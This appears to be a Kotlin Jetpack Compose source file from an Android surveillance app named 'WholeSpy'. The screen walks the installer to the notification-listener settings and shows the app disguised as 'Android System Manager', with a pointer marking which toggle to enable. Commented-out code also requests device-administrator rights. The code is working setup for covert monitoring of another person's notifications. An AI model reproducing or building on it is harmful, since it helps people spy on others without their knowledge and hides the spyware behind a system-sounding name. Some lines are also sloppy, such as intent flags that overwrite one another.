package com.screening.app.featureInstallation.presentation.permissions

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import com.screening.app.R
import com.screening.app.featureInstallation.WholeSpyScreen
import com.screening.app.featureInstallation.presentation.permissions.components.PermissionFrame
import com.screening.app.ui.sizes
import com.screening.app.ui.spacing
import com.screening.app.ui.theme.*
import com.screening.app.utilities.logVerbose

@Composable
fun NotificationAccessPermissionScreen(
    onScreenChange: (WholeSpyScreen) -> Unit,
    viewModel: MainViewModel = hiltViewModel()
) {

    val currentContext = LocalContext.current

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult(),
        onResult = { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data

            } else if (result.resultCode == Activity.RESULT_CANCELED) {

            }
        }
    )

    PermissionFrame(
        screen = Screen.DisplayOverAppsScreen,
        content = {
            Column {
                DisplayOverAppsPermissionTitle()
                DisplayOverAppsPermissionDetail(modifier = Modifier.weight(1f))
                Spacer(
                    modifier = Modifier
                        .height(MaterialTheme.spacing.x10Dp)
                        .background(
                            WhiteColor
                        )
                )
            }
        },
        skipPermission = {
            currentContext.logVerbose("skip management of all files permission")
        },
        allowPermission = {
            currentContext.logVerbose("allow management of all files permission")
            val intent: Intent =
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
                } else {
                    Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                }
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK
            intent.flags = Intent.FLAG_ACTIVITY_NO_HISTORY
            intent.flags = Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            launcher.launch(intent)

//            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
//            intent.addCategory("android.intent.category.DEFAULT")
//            intent.data = Uri.parse(String.format("package:%s", currentContext.packageName))
//            launcher.launch(intent)
        }
    )

//    Box(modifier = Modifier.background(WhiteColor)) {
//        Column(
//            modifier = Modifier.fillMaxSize(),
//            verticalArrangement = Arrangement.Top
//        ) {
//
//            Box(
//                modifier = Modifier
//                    .padding(
//                        horizontal = MaterialTheme.spacing.medium,
//                        vertical = MaterialTheme.spacing.xDp
//                    )
//                    .fillMaxWidth()
//                    .wrapContentHeight(),
//                contentAlignment = Alignment.CenterEnd
//            ) {
//
//                Box(
//                    modifier = Modifier
//                        .width(MaterialTheme.spacing.x4Dp)
//                        .height(MaterialTheme.spacing.x4Dp)
//                        .clickable {
//                            viewModel.setPermissionState(Screen.LocationScreen)
//                        },
//                    contentAlignment = Alignment.Center
//                ) {
//                    Text(
//                        text = "Skip",
//                        style = TextStyle(
//                            color = BlackColor,
//                            fontSize = MaterialTheme.sizes.mediumLarge,
//                            fontWeight = FontWeight.SemiBold
//                        ),
//                        modifier = Modifier
//                            .wrapContentWidth()
//                            .wrapContentHeight(),
//                        textAlign = TextAlign.Center
//                    )
//                }
//            }
//
//            Column(
//                verticalArrangement = Arrangement.spacedBy(-(MaterialTheme.spacing.x10Dp)),
//                modifier = Modifier.weight(1f)
//            ) {
//                Box(
//                    modifier = Modifier
//                        .weight(1f)
//                        .padding(
//                            start = MaterialTheme.spacing.large,
//                            end = MaterialTheme.spacing.large
//                        )
//                        .border(
//                            width = MaterialTheme.spacing.xDp,
//                            color = Color.Black,
//                            shape = RoundedCornerShape(
//                                topStart = MaterialTheme.spacing.x4Dp,
//                                topEnd = MaterialTheme.spacing.x4Dp
//                            )
//                        )
//                        .clip(
//                            RoundedCornerShape(
//                                topStart = MaterialTheme.spacing.x4Dp,
//                                topEnd = MaterialTheme.spacing.x4Dp
//                            )
//                        )
//                        .background(LightGrayColor)
//                        .padding(
//                            top = MaterialTheme.spacing.x2Dp,
//                            start = MaterialTheme.spacing.xDp,
//                            end = MaterialTheme.spacing.xDp
//                        )
//                ) {
//
//                    Column {
//                        NotificationAccessPermissionBar()
//                        NotificationAccessPermissionAllow(
//                            modifier = Modifier
//                                .weight(1f)
//                                .background(WhiteColor),
//                            permissionList = notificationPermissionsList
//                        )
//                        Spacer(
//                            modifier = Modifier
//                                .height(MaterialTheme.spacing.x10Dp)
//                                .background(
//                                    WhiteColor
//                                )
//                        )
//                    }
//                }
//
//                Column(
//                    modifier = Modifier
//                        .wrapContentHeight()
//                        .fillMaxWidth()
//                        .clip(
//                            RoundedCornerShape(
//                                topStart = MaterialTheme.spacing.x5Dp,
//                                topEnd = MaterialTheme.spacing.x5Dp
//                            )
//                        )
//                        .background(SlateBlue)
//                        .padding(
//                            horizontal = MaterialTheme.spacing.xDp,
//                            vertical = MaterialTheme.spacing.xDp
//                        )
//                ) {
////                    PermissionScreenFooter {
//                        val demoDeviceAdmin = ComponentName(
//                            currentContext,
//                            WholeSpyDeviceAdminReceiver::class.java
//                        )
//                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
//                        intent.putExtra(
//                            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
//                            demoDeviceAdmin
//                        )
//                        launcher.launch(intent)
////                    }
//                }
//            }
//        }
//    }
}

@Composable
fun NotificationAccessPermissionBar() {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .background(LightGrayColor)
            .padding(
                start = MaterialTheme.spacing.xDp,
                bottom = MaterialTheme.spacing.mediumLarge
            ),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.Start
    ) {

        Icon(
            imageVector = Icons.Filled.ArrowBack,
            contentDescription = "Back Arrow",
            modifier = Modifier
                .size(MaterialTheme.spacing.x2Dp),
            tint = BlackColor
        )

        Spacer(modifier = Modifier.width(MaterialTheme.spacing.xDp))

        Text(
            modifier = Modifier.weight(1f),
            text = "Notification Access",
            color = BlackColor,
            fontSize = MaterialTheme.sizes.mediumLarge,
            fontWeight = FontWeight.SemiBold,
            fontFamily = FontFamily.Default
        )
    }
}

@Composable
fun NotificationAccessPermissionAllow(
    modifier: Modifier,
    permissionList: List<NotificationPermissionItem>
) {

    LazyColumn(
        modifier = modifier
            .fillMaxSize()
            .padding(
                MaterialTheme.spacing.medium
            )
    ) {
        items(permissionList) { permissionItem ->
            NotificationPermissionItem(permissionItem = permissionItem)
            Divider()
        }
    }
}

@Composable
fun NotificationPermissionItem(permissionItem: NotificationPermissionItem) {
    val isApp = permissionItem.name == "Android System Manager"
    Column(
        verticalArrangement = if (isApp) Arrangement.spacedBy(-(30).dp) else Arrangement.spacedBy(0.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .wrapContentHeight()
                .background(
                    WhiteColor
                )
                .graphicsLayer {
                    if (!isApp) {
                        alpha = 0.4f
                    }
                }
                .padding(MaterialTheme.spacing.small),
            horizontalArrangement = Arrangement.End,
            verticalAlignment = Alignment.CenterVertically
        ) {

            Row(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {

                Image(
                    painter = painterResource(id = permissionItem.icon),
                    contentDescription = "App Logo",
                    Modifier
                        .size(
                            width = MaterialTheme.spacing.x3Dp,
                            height = MaterialTheme.spacing.x3Dp
                        )
                )

                Spacer(modifier = Modifier.width(MaterialTheme.spacing.small))

                Text(
                    text = permissionItem.name,
                    modifier = Modifier
                        .weight(1f)
                        .wrapContentHeight(),
                    color = BlackColor,
                    fontSize = MaterialTheme.sizes.medium,
                    fontWeight = FontWeight.SemiBold,
                    textAlign = TextAlign.Start
                )

            }

            Switch(
                checked = permissionItem.isOne,
                onCheckedChange = {},
                modifier = Modifier
                    .padding(end = MaterialTheme.spacing.small)
                    .size(MaterialTheme.spacing.xDp)
            )
        }

        if (isApp) {
            Box(
                contentAlignment = Alignment.CenterEnd,
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(end = MaterialTheme.spacing.x3Dp)
            ) {
                Image(
                    painter = painterResource(id = R.drawable.hand_pointer),
                    contentDescription = "Hand pointer",
                    modifier = Modifier.size(MaterialTheme.spacing.x3Dp)
                )
            }
        }
    }
}

data class NotificationPermissionItem(
    val icon: Int = R.drawable.logo,
    val name: String = "",
    val isOne: Boolean = false
)

val notificationPermissionsList =
    listOf(
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Air Command",
            isOne = true
        ),
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Android Auto",
            isOne = false
        ),
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Android System Manager",
            isOne = true
        ),
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Google Play Services",
            isOne = false
        ),
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Music Player",
            isOne = false
        ),
        NotificationPermissionItem(
            icon = R.drawable.logo,
            name = "Voice Recorder",
            isOne = true
        )
    )

@Preview
@Composable
fun NotificationAccessPermissionScreenPreview() {
}